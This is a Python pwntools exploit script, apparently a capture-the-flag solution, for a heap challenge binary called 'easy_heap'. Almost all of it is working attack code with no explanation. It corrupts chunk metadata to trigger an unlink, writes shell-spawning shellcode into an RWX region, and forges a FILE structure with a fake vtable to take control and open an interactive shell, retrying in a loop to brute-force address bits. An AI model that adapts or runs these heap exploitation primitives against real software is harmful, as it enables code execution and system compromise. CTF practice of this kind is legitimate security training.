from mypwn import *
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)
context(log_level='debug',os='linux',arch='amd64')#,aslr=0)
p=None

def debugf(s=''):
    gdb.attach(p,s)

libcpath=None
binarypath='./easy_heap'
def run(ip=None,port=None):
    global p
    if libcpath and binarypath:
        p=process(binarypath,env={'LD_PRELOAD':libcpath})
    elif ip and port:
        p=remote(ip,port)
    elif binarypath:
        p=process(binarypath)
    else:
        p=process('./pwn')

def menu(i):
    ru(">> ")
    sl(str(i))

def add(size):
    menu(1)
    ru('Size: ')
    sl(str(size))

def delete(index):
    menu(2)
    ru('Index: ')
    sl(str(index))

def edit(i,con):
    menu(3)
    ru('Index: ')
    sl(str(i))
    ru('Content: ')
    sd(con)

def exp():
    run()
    ru('Mmap: ')
    rwx=int(rl().strip(),16)
    print(hex(rwx))
    add(0x78)           # 0
    ru('Address ')
    text=int(rl().strip(),16)
    add(0xf8)           # 1
    add(0x58)           # 2
    add(0x18)           # 3
    add(0x3f0)          # 4 freed
    def unlink():
        edit(3,'\x00'*0x10+p64(0x70+0x100+0x20+0x60))
        edit(0,'\x00'*0x10+p64(text-0x18)+p64(text-0x10)+'\n')
        delete(4)              # overlap
    unlink()
    add(0x60+0x60+0x100) # 4 freed
    add(0x10)           # 5
    delete(4)
    add(0x60+0x100)     # 4
    add(0xf0)          # 6
    add(0xf0)          # 7      to do what?
    add(0xf0)          # 8
    add(0x90)          # 9
    add(0xf0)         # 10
    delete(9)
    add(0x400)        # 9 avoid
    
    def shellcode():
        edit(0,'\x00'*0x10+p64(0x1000)+p64(rwx)+p64(0x1000)+'\n') # need to fake vtable here
        edit(0,asm(shellcraft.sh())+'\n')
    shellcode()
    delete(7)
    def fake_IO():
        payload='\x00'*0xf0
        di={
            0xc0:p32(0xffffffff),
            0x28:p64(1),
            0x20:p64(0),
            0xd8:p64(text-0x18),           # point to vtable
            0x188:p64(0x101),
            0x198:p16(0x9510)
        }
        payload+=fit(di,filler='\x00')
        edit(1,payload+'\n')
    fake_IO()
    # debugf()
    add(0x100)
    # edit()
    p.interactive()

for i in range(16):
    try:
        exp()
    except:
        p.close()